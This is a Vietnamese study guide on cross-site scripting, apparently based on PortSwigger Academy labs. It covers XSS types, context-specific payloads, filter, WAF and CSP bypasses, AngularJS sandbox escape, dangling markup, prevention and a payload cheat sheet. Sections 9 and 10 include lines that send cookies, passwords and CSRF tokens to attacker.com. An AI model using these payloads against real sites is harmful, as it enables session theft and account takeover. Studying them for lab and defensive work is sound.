# CROSS-SITE SCRIPTING (XSS) — KIẾN THỨC TỔNG HỢP

> Tài liệu tổng hợp lý thuyết XSS dựa trên PortSwigger Web Security Academy, biên soạn đầy đủ, có cấu trúc, kèm ví dụ payload theo từng ngữ cảnh (context).

## Mục lục

1. [XSS là gì?](#1-xss-là-gì)
2. [Các loại XSS](#2-các-loại-xss)
3. [Cách tìm & kiểm thử XSS](#3-cách-tìm--kiểm-thử-xss)
4. [XSS theo ngữ cảnh (context) chèn payload](#4-xss-theo-ngữ-cảnh-context-chèn-payload)
5. [DOM-based XSS: Source & Sink](#5-dom-based-xss-source--sink)
6. [Kỹ thuật vượt filter / WAF / sanitizer](#6-kỹ-thuật-vượt-filter--waf--sanitizer)
7. [AngularJS sandbox escape](#7-angularjs-sandbox-escape)
8. [Content Security Policy (CSP) & cách bypass](#8-content-security-policy-csp--cách-bypass)
9. [Dangling markup injection](#9-dangling-markup-injection)
10. [Khai thác XSS thực tế (impact)](#10-khai-thác-xss-thực-tế-impact)
11. [Cách phòng chống XSS](#11-cách-phòng-chống-xss)
12. [Cheat sheet payload nhanh](#12-cheat-sheet-payload-nhanh)
13. [Danh sách lab liên quan](#13-danh-sách-lab-liên-quan)

---

## 1. XSS là gì?

Cross-site scripting (XSS) là lỗ hổng cho phép kẻ tấn công can thiệp vào tương tác của người dùng khác với ứng dụng dễ bị tổn thương. Nó cho phép attacker **bỏ qua same-origin policy**, vốn được thiết kế để tách biệt các website khác nhau với nhau.

Lỗ hổng XSS thường cho phép attacker mạo danh nạn nhân, thực hiện mọi hành động mà người dùng có thể làm, và truy cập mọi dữ liệu của người dùng. Nếu nạn nhân có quyền truy cập đặc quyền trong ứng dụng, attacker có thể **chiếm toàn quyền** đối với chức năng và dữ liệu của ứng dụng.

**Cơ chế:** XSS hoạt động bằng cách chèn (inject) mã JavaScript độc hại vào trang web, khiến trình duyệt của nạn nhân thực thi mã đó **trong ngữ cảnh (origin) của website hợp pháp**, do đó có toàn quyền truy cập DOM, cookie, localStorage, và có thể gửi request thay mặt nạn nhân.

## 2. Các loại XSS

| Loại | Mô tả | Đặc điểm |
|---|---|---|
| **Reflected XSS** | Payload nằm trong request (URL/param/body), server phản chiếu (reflect) nguyên văn vào response mà không xử lý an toàn | Không lưu trữ; cần lừa nạn nhân click link độc hại |
| **Stored XSS** | Payload được lưu vào server (DB, file, log...) rồi hiển thị lại cho người dùng khác | Nguy hiểm hơn — ảnh hưởng mọi người xem trang, không cần tương tác thêm |
| **DOM-based XSS** | Payload không đi qua server; JavaScript phía client đọc dữ liệu không tin cậy (source) và ghi vào sink nguy hiểm, làm thay đổi DOM | Không cần server xử lý sai — lỗi hoàn toàn ở client-side script |

## 3. Cách tìm & kiểm thử XSS

Quy trình kiểm thử hệ thống:

1. **Xác định mọi điểm nhập liệu** phản ánh lại trong response: query param, form field, HTTP header (User-Agent, Referer...), cookie, URL fragment (`#`), JSON/XML body.
2. **Test với payload trung tính** để xác định vị trí phản ánh và ngữ cảnh:
   ```
   xssTEST123'"><
   ```
3. **Quan sát** payload xuất hiện ở đâu trong HTML response (text node? attribute? script? URL?) và ký tự nào bị encode/lọc.
4. **Xây payload phù hợp với ngữ cảnh** cụ thể đã xác định (xem [mục 4](#4-xss-theo-ngữ-cảnh-context-chèn-payload)).
5. Với DOM XSS: dùng **Burp DOM Invader** hoặc đọc source JS để tìm cặp source/sink nguy hiểm.

## 4. XSS theo ngữ cảnh (context) chèn payload

### 4.1. HTML context (không bị encode)

Payload chèn thẳng vào giữa 2 thẻ HTML, không ký tự nào bị lọc/encode:

```html
<script>alert(1)</script>
```

Nếu thẻ `<script>` bị lọc, dùng thẻ khác có thể tự thực thi:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### 4.2. HTML attribute context

Payload nằm trong giá trị 1 thuộc tính, ví dụ:

```html
<input value="INJECT_HERE">
```

Nếu dấu `<` `>` bị HTML-encode nhưng dấu nháy kép không bị encode → thoát khỏi attribute bằng nháy kép rồi thêm event handler mới:

```html
" autofocus onfocus=alert(1) x="
```

Nếu chỉ có thẻ `<img>` khả dụng (không escape được `<`/`>` nhưng attribute chưa đóng đúng):

```html
" onmouseover="alert(1)
```

### 4.3. JavaScript string context

Payload nằm trong 1 chuỗi JS đã có sẵn trong `<script>`:

```js
var searchTerm = 'INJECT_HERE';
```

Nếu `<` `>` bị HTML-encode nhưng nháy đơn KHÔNG bị escape:

```js
'-alert(1)-'
'; alert(1); //
\';alert(1)//
```

Nếu nháy đơn **bị escape bằng backslash** (`\'`), nhưng backslash không tự escape → dùng thêm backslash để "vô hiệu hoá" backslash escape:

```js
\'-alert(1)-\'
```
(chèn `\` trước để cặp với `\'` có sẵn, biến `\\'` thành thoát chuỗi thành công)

### 4.4. Template literal context (backtick `` ` ``)

Nếu injection point nằm trong JS **template literal** (`` `...${...}...` ``), có thể dùng cú pháp `${...}` để thực thi biểu thức JS mà không cần thoát khỏi chuỗi bằng quote:

```js
${alert(1)}
```

Nếu mọi ký tự đặc biệt (`<>'"\` `` ` ``) đều bị Unicode-escape, vẫn có thể dùng chính cú pháp `${}` vì nó không chứa các ký tự bị lọc.

### 4.5. URL context

Payload nằm trong giá trị `href`/`src`:

```html
<a href="INJECT_HERE">click</a>
```

Nếu kiểm soát toàn bộ URL, dùng scheme `javascript:`:

```
javascript:alert(1)
```

### 4.6. CSS context

Hiếm hơn nhưng có thể dùng `expression()` (IE cũ) hoặc `url()` để exfiltrate dữ liệu qua CSS injection — ít gặp trong các lab hiện đại.

## 5. DOM-based XSS: Source & Sink

**Source:** nơi dữ liệu không tin cậy đi vào — do attacker kiểm soát được.

| Source | Mô tả |
|---|---|
| `location.search`, `location.hash`, `location.pathname` | Query string / fragment / path của URL |
| `document.referrer` | Trang trước đó |
| `document.cookie` | Cookie |
| `window.name` | Tên cửa sổ |
| `postMessage` data | Dữ liệu nhận qua `message` event |

**Sink:** nơi dữ liệu được sử dụng theo cách có thể gây thực thi mã.

| Sink | Rủi ro |
|---|---|
| `document.write()` / `document.writeln()` | Ghi thẳng HTML vào trang |
| `element.innerHTML` / `outerHTML` | Parse HTML, thực thi script/event handler |
| `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function()` | Thực thi chuỗi như code JS |
| `element.setAttribute('href'/'src', ...)` | Có thể set `javascript:` URL |
| jQuery `$(selector)`, `.html()`, `.append()` | Nếu selector/nội dung không được sanitize |
| `angular` expression binding | AngularJS sandbox (xem mục 7) |

**Quy trình khai thác DOM XSS:**
1. Xác định biến/nguồn dữ liệu attacker kiểm soát (source).
2. Trace luồng dữ liệu qua code JS đến nơi nó được dùng để cập nhật DOM (sink).
3. Xây payload phù hợp ngữ cảnh của sink đó.
4. Dùng Burp **DOM Invader** để tự động phát hiện cặp source/sink trong trang phức tạp.

## 6. Kỹ thuật vượt filter / WAF / sanitizer

| Kỹ thuật chặn của ứng dụng | Cách vượt |
|---|---|
| Block 1 số thẻ nguy hiểm (`<script>`, `<img>`...) | Dùng thẻ khác chưa bị chặn, ví dụ `<body onload=...>`, `<iframe onload=...>`, `<svg onload=...>` |
| Whitelist tag nhưng thiếu event handler filter | Dùng attribute event handler ít phổ biến: `onpointerover`, `onanimationstart`, `onbeforecopy`... |
| Chỉ cho phép custom (unknown) tag | Dùng custom tag + `onfocus`/`tabindex`/`autofocus` để trigger không cần click: `<xss id=x onfocus=alert(1) tabindex=1>#x` |
| Chặn tất cả tag nhưng cho phép SVG | Dùng markup SVG hợp lệ chứa animation event: `<svg><a><animate attributeName=href values=javascript:alert(1) /></a></svg>` |
| WAF so khớp signature từ khóa | Đổi hoa/thường (`OnLoAd`), thêm khoảng trắng/newline thừa, encode HTML entity/URL/Unicode |
| Encode `<`, `>` | Nếu injection point là attribute và `"` không bị encode → thoát bằng `"` rồi thêm attribute event mới, không cần `<>` |
| Escape `'` bằng `\` | Chèn thêm `\` để "nuốt" backslash sẵn có, biến chuỗi escape thành thoát chuỗi thật |
| CSP chặn inline script | Xem [mục 8](#8-content-security-policy-csp--cách-bypass) |

## 7. AngularJS sandbox escape

Các phiên bản AngularJS cũ dùng "sandbox" để giới hạn biểu thức trong `{{ }}` không truy cập được các API nguy hiểm (`window`, `document`...). Tuy nhiên sandbox này từng bị bypass nhiều lần.

**Escape không cần dấu ngoặc kép/đơn** (khi `'` `"` bị lọc):

```
{{constructor.constructor('alert(1)')()}}
```

Payload này lợi dụng `constructor` của object để lấy ra hàm `Function` toàn cục, rồi dùng nó biên dịch & thực thi chuỗi code tùy ý mà không cần literal string trong payload chính (chuỗi `'alert(1)'` vẫn cần nhưng có thể encode khác nếu bị lọc thêm).

**Kết hợp CSP:** Nếu trang set `Content-Security-Policy: script-src 'self'` nhưng vẫn load AngularJS từ CDN được whitelist, có thể lợi dụng chính AngularJS đã được cho phép để escape sandbox và chạy code — biến 1 script hợp lệ được CSP tin tưởng thành công cụ thực thi payload.

## 8. Content Security Policy (CSP) & cách bypass

**CSP là gì:** cơ chế phòng thủ theo lớp (defense-in-depth) qua HTTP response header, giới hạn nguồn script/style/... được phép load & chặn inline script mặc định:

```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com
```

**Các cách bypass CSP thường gặp:**

- **JSONP endpoint** được whitelist trong `script-src` → dùng JSONP callback để thực thi code tuỳ ý:
  ```html
  <script src="https://trusted.com/jsonp?callback=alert(1)//"></script>
  ```
- **Whitelist quá rộng** (ví dụ `*.trusted.com`) → tìm subdomain có thể host nội dung attacker kiểm soát.
- **`unsafe-inline` vẫn bật**, hoặc thiếu `nonce`/`hash` chặt chẽ.
- **Thiếu `object-src`/`base-uri`** → dùng `<base href="//attacker.com/">` để đổi base URL, khiến các script tương đối load từ domain attacker.
- **Library đã được whitelist có sandbox escape** (ví dụ AngularJS ở mục 7) → tận dụng chính library hợp lệ để thực thi payload.

## 9. Dangling markup injection

Kỹ thuật dùng khi **không thể thực thi JavaScript trực tiếp** (do CSP rất chặt) nhưng vẫn chèn được HTML — mục tiêu là **exfiltrate dữ liệu nhạy cảm còn lại trong trang** (ví dụ CSRF token) bằng cách mở 1 thẻ HTML không đóng, khiến trình duyệt tự động "nuốt" toàn bộ phần còn lại của trang vào giá trị thuộc tính, rồi gửi nó ra ngoài qua request ảnh:

```html
<img src='https://attacker.com/log?data=
```

Trình duyệt sẽ tiếp tục đọc phần HTML phía sau (bao gồm token nhạy cảm) làm giá trị của `src` cho đến khi gặp dấu `'` hoặc `>` tiếp theo trong trang gốc, rồi gửi toàn bộ nội dung đó dưới dạng request đến server attacker.

## 10. Khai thác XSS thực tế (impact)

- **Đánh cắp session cookie:**
  ```js
  document.location='https://attacker.com/log?c='+document.cookie
  ```
  (Lưu ý: cookie có `HttpOnly` sẽ không đọc được bằng JS.)
- **Capture credentials** bằng cách chèn form login giả hoặc keylogger:
  ```js
  document.write('<input name=username id=username>Fake username<input name=password type=password id=password onchange="fetch(`https://attacker.com/log?p=${document.getElementById(\'password\').value}`)">')
  ```
- **Bypass CSRF defenses:** vì mã chạy trong origin hợp lệ, có thể tự đọc CSRF token từ DOM và tự submit form nhạy cảm thay attacker — vô hiệu hoá hoàn toàn cơ chế CSRF token truyền thống.
- **Chiếm toàn quyền tài khoản:** đổi email/password, thực hiện hành động nhạy cảm thay nạn nhân.

## 11. Cách phòng chống XSS

1. **Encode output đúng theo ngữ cảnh:** HTML-entity encode khi render vào HTML body, attribute-encode khi render vào attribute, JS-string-escape khi render vào script, URL-encode khi render vào URL.
2. **Không dùng sink nguy hiểm với dữ liệu không tin cậy:** tránh `innerHTML`, `document.write`, `eval` — ưu tiên `textContent`, `createElement` + `setAttribute` với whitelist.
3. **Sanitize HTML input được phép** (rich text) bằng thư viện đã kiểm chứng (ví dụ DOMPurify), không tự viết blacklist.
4. **Content Security Policy chặt chẽ:** `script-src 'self'` kèm `nonce`/`hash`, không dùng `unsafe-inline`/`unsafe-eval`, khai báo `object-src 'none'`, `base-uri 'self'`.
5. **HttpOnly + Secure + SameSite cho cookie session** để giảm thiệt hại nếu XSS xảy ra.
6. **Framework hiện đại** (React, Angular mới, Vue) tự động encode output theo mặc định — hạn chế dùng API "raw HTML" (`dangerouslySetInnerHTML`, `[innerHTML]`, `v-html`) trừ khi dữ liệu đã qua sanitize.

## 12. Cheat sheet payload nhanh

| Ngữ cảnh | Payload mẫu |
|---|---|
| HTML thô | `<script>alert(1)</script>` |
| Thẻ bị lọc, cần auto-trigger | `<img src=x onerror=alert(1)>` / `<svg onload=alert(1)>` |
| Attribute (đóng bằng `"`) | `" autofocus onfocus=alert(1) x="` |
| Attribute (đóng bằng `'`) | `' autofocus onfocus=alert(1) x='` |
| JS string (nháy đơn không escape) | `';alert(1);//` |
| JS string (nháy đơn bị `\` escape) | `\';alert(1)//` |
| Template literal | `${alert(1)}` |
| URL/href | `javascript:alert(1)` |
| Custom tag + tabindex (no click) | `"><xss id=x onfocus=alert(1) tabindex=1>#x` |
| AngularJS sandbox escape | `{{constructor.constructor('alert(1)')()}}` |
| SVG animate (tag whitelist hẹp) | `<svg><a><animate attributeName=href values=javascript:alert(1) /></a></svg>` |

## 13. Danh sách lab liên quan

Xem chi tiết từng bước khai thác tại [`LAB_XSS_CROSS-SITE SCRIPTING.md`](./LAB_XSS_CROSS-SITE%20SCRIPTING.md).

1. Reflected XSS into HTML context with nothing encoded
2. Stored XSS into HTML context with nothing encoded
3. DOM XSS in `document.write` sink using source `location.search`
4. DOM XSS in `innerHTML` sink using source `location.search`
5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
6. DOM XSS in jQuery selector sink using a `hashchange` event
7. Reflected XSS into attribute with angle brackets HTML-encoded
8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded
9. Reflected XSS into a JavaScript string with angle brackets HTML encoded
10. DOM XSS in `document.write` sink using source `location.search` inside a select element
11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
12. Reflected DOM XSS
13. Stored DOM XSS
14. Reflected XSS into HTML context with most tags and attributes blocked
15. Reflected XSS into HTML context with all tags blocked except custom ones
16. Reflected XSS with some SVG markup allowed
17. Reflected XSS in canonical link tag
18. Reflected XSS into a JavaScript string with single quote and backslash escaped
19. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
20. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
21. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
22. Exploiting cross-site scripting to steal cookies
23. Exploiting cross-site scripting to capture passwords
24. Exploiting XSS to bypass CSRF defenses
25. Reflected XSS with AngularJS sandbox escape without strings
26. Reflected XSS with AngularJS sandbox escape and CSP
27. Reflected XSS with event handlers and `href` attributes blocked
28. Reflected XSS in a JavaScript URL with some characters blocked
29. Reflected XSS protected by very strict CSP, with dangling markup attack
30. Reflected XSS protected by CSP, with CSP bypass

